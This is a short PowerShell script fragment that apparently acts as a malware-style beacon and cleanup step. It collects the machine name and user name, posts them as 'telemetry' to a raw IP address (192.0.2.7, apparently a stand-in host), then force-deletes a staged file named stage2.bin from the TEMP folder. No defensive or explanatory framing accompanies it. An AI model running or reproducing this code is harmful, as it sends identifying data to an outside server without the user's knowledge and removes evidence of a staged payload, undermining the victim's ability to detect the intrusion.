$PayloadJson = [ordered]@{ Host = $env:COMPUTERNAME; User = $env:USERNAME; Stage = "telemetry" } | ConvertTo-Json
Invoke-RestMethod -Uri "https://192.0.2.7/upload" -Method Post -Body $PayloadJson -ContentType "application/json"
Set-Location -Path $env:TEMP
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
